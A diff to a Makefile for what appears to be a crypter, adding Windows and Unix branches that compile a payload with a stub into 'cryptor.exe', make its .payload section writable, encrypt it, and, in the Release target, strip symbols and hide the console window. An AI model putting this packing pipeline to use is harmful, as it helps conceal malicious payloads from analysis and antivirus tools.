@@ -23,46 +23,102 @@ SrcPath = ./CL_SRC
 SvrPath = ./SVR_SRC
 Payload?= ./
 INC=-I./CL_src
-Debug: $(SrcPath)/main.c $(SrcPath)/linker.ld | $(Dpath)
+Debug: $(SrcPath)/main.c $(SrcPath)/win32Linker.ld | $(Dpath)
 
+ifeq ($(OS),Windows_NT)
 	@echo [*] Dynamically Generating header files
-
 	@echo [*] Installing Python requirements
-	python3 install.py
+	@py -3 install.py
 	@echo [*] Checking Config File for server requirements. This may require configration!
-	python3 ./MFScripts/config.py
+	@py -3 ./MFScripts/config.py
 	@echo Config file found at expected location!
 	@echo [*] Generating keys...
-	python3 ./MFScripts/KeyGen.py
+	@py -3 ./MFScripts/KeyGen.py
 	@echo Keys Generated!
 	@echo Header files Generated.
 	@echo [*] LINKING FILE...
-	# We are going to use a sub directory and make both objects
+	@# We are going to use a sub directory and make both objects
 	gcc -c  $(SrcPath)/main.c  -o $(Dpath)/cryptor.o 
 	gcc -c  ./payload/$(Payload)/*.c  -o $(Dpath)/payload.o $(INC)
-	
-	gcc -g -T $(SrcPath)/linker.ld   $(Dpath)/cryptor.o $(Dpath)/payload.o -o $(Dpath)/cryptor.exe -lCrypt32 -lWs2_32 -lBCrypt
-	@echo COMPLETED: file has been linked into a mn executable format!
 
+	gcc -g -T $(SrcPath)/win32Linker.ld   $(Dpath)/cryptor.o $(Dpath)/payload.o -o $(Dpath)/cryptor.exe -lCrypt32 -lWs2_32 -lBCrypt
+	@echo COMPLETED: file has been linked into an executable format!
 
 	@echo [*] REMOVING READONLY PROTECTION FROM .payload...
 	objcopy --set-section-flags .payload=code,data,alloc,contents,load $(Dpath)/cryptor.exe $(Dpath)/cryptor.exe
 	@echo COMPLETED, .payload section is now writable
 
 	@echo [*] Encrypting .payload section...
-	python3 ./MFScripts/cryptPayload.py $(Dpath)
+	@py -3 ./MFScripts/cryptPayload.py $(Dpath)
 
-Release: $(SrcPath)/main.c $(SrcPath)/linker.ld | $(Rpath)
 
+else
+	@echo [*] Dynamically Generating header files
+	@echo [*] Installing Python requirements
+	@python3 install.py
+	@echo [*] Checking Config File for server requirements. This may require configration!
+	@python3 ./MFScripts/config.py
+	@echo Config file found at expected location!
+	@echo [*] Generating keys...
+	@python3 ./MFScripts/KeyGen.py
+	@echo Keys Generated!
+	@echo Header files Generated.
+	@echo [*] LINKING FILE...
+	@# We are going to use a sub directory and make both objects
+	gcc -c  $(SrcPath)/main.c  -o $(Dpath)/cryptor.o 
+	gcc -c  ./payload/$(Payload)/*.c  -o $(Dpath)/payload.o $(INC)
+	gcc -g -T $(SrcPath)/linker.ld   $(Dpath)/cryptor.o $(Dpath)/payload.o -o $(Dpath)/cryptor.exe -lCrypt32 -lWs2_32 -lBCrypt
+	
+	@echo COMPLETED: file has been linked into a mn executable format!
+	@echo [*] REMOVING READONLY PROTECTION FROM .payload...
+	objcopy --set-section-flags .payload=code,data,alloc,contents,load $(Dpath)/cryptor.exe $(Dpath)/cryptor.exe
+	@echo COMPLETED, .payload section is now writable
+
+	@echo [*] Encrypting .payload section...
+	@python3 ./MFScripts/cryptPayload.py $(Dpath)
+endif
+
+Release: $(SrcPath)/main.c $(SrcPath)/win32linker.ld | $(Rpath)
+
+ifeq ($(OS),Windows_NT)
 	@echo [*] Dynamically Generating header files
 
 	@echo [*] Installing Python requirements
-	python3 install.py
+	@py -3 install.py
 	@echo [*] Checking Config File for server requirements. This may require configration!
-	python3 ./MFScripts/config.py
+	@py -3 ./MFScripts/config.py
 	@echo Config file found at expected location!
 	@echo [*] Generating keys...
-	python3 ./MFScripts/KeyGen.py
+	@py -3 ./MFScripts/KeyGen.py
+	@echo Keys Generated!
+	@echo Header files Generated.
+
+	@echo [*] LINKING FILE...
+	
+	gcc -c  $(SrcPath)/main.c  -o $(Rpath)/cryptor.o
+	gcc -c  ./payload/$(Payload)/*.c  -o $(Rpath)/payload.o $(INC)
+	
+	gcc -s -static -mwindows -fvisibility=hidden -T $(SrcPath)/win32Linker.ld  $(Rpath)/cryptor.o $(Rpath)/payload.o -o $(Rpath)/cryptor.exe -lCrypt32 -lWs2_32 -lBCrypt
+	@echo COMPLETED: file has been linked into a mn executable format!
+	strip -R .comment -R .note $(Rpath)/cryptor.exe
+	strip -s $(Rpath)/cryptor.exe
+
+	@echo [*] REMOVING READONLY PROTECTION FROM .payload...
+	objcopy --set-section-flags .payload=code,data,alloc,contents,load $(Rpath)/cryptor.exe $(Rpath)/cryptor.exe
+	@echo COMPLETED, .payload section is now writable
+
+	@echo [*] Encrypting .payload section...
+	@py -3 ./MFScripts/cryptPayload.py $(Rpath)
+else
+	@echo [*] Dynamically Generating header files
+
+	@echo [*] Installing Python requirements
+	@python3 install.py
+	@echo [*] Checking Config File for server requirements. This may require configration!
+	@python3 ./MFScripts/config.py
+	@echo Config file found at expected location!
+	@echo [*] Generating keys...
+	@python3 ./MFScripts/KeyGen.py
 	@echo Keys Generated!
 	@echo Header files Generated.
 
@@ -81,7 +137,8 @@ Release: $(SrcPath)/main.c $(SrcPath)/linker.ld | $(Rpath)
 	@echo COMPLETED, .payload section is now writable
 
 	@echo [*] Encrypting .payload section...
-	python3 ./MFScripts/cryptPayload.py $(Rpath)
+	@python3 ./MFScripts/cryptPayload.py $(Rpath)
+endif
 
 Clean:
 	@echo Cleanning all generated files and directories
